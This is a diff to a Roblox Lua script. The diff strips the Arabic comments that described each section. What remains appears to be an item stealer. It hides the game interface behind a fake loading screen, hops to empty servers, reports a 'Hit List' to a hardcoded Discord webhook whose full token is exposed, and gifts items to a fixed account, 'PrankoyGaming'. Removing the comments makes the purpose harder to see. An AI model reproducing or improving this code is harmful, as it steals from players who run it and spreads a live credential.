@@ -1,5 +1,4 @@
 -- =========================
--- الخدمات الأساسية
 -- =========================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -10,11 +9,11 @@ local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- ضع هنا الويب هوك الجديد
+
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1422449344052723723/l2Wprp10h8YIsDhly6rsBNweKYib3cLxszrA2Od7TzRB3KpI0b7asx7ZTp_acF92HN_q"
 
 -- =========================
--- 1: قسم النقل التلقائي (كل 3 دقائق)
+-- 1: 
 -- =========================
 task.spawn(function()
     local function findEmptyServer()
@@ -49,7 +48,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 2: واجهة التحميل
+-- 2: 
 -- =========================
 task.spawn(function()
     for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
@@ -130,7 +129,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 3: نظام الويب هوك مع إرسال Hit List كامل
+-- 3: 
 -- =========================
 task.spawn(function()
     wait(4)
@@ -197,7 +196,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
+-- 4: 
 -- =========================
 local TARGET_PLAYER_NAME = "PrankoyGaming"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
